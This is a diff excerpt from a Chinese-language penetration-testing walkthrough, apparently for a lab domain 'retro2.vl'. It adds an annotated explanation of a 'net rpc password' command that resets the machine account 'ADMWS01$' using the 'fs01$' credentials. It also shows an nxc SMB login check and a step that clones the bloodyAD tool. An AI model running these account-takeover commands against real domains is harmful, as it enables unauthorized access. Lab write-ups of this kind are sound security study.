@@ -134,6 +134,15 @@ $ net rpc password 'ADMWS01$' Roguel -U retro2.vl/'fs01$'%Roguel -S BLN01.retro2
 
 $ nxc smb BLN01.retro2.vl -u 'ADMWS01$' -p 'Roguel'
 ```
+```
+//解析
+
+net rpc password → 用 RPC 协议修改密码 |'ADMWS01$' → 目标账号名（这里是一个计算机账户，末尾的 $ 说明是机器账户）| Roguel → 要设置的新密码
+
+-U → 指定登录凭据 | retro2.vl/ → 域名 | 'fs01$' → 用来认证的账户（也是个机器账户） | %Roguel → 这个账户的密码
+
+-S → 指定要连接的服务器（目标 DC 或能处理密码修改的机器） | BLN01.retro2.vl → 目标服务器主机名
+```
 #### 上瑞士军刀 加入服务器
 ```
 $ git clone https://github.com/CravateRouge/bloodyAD
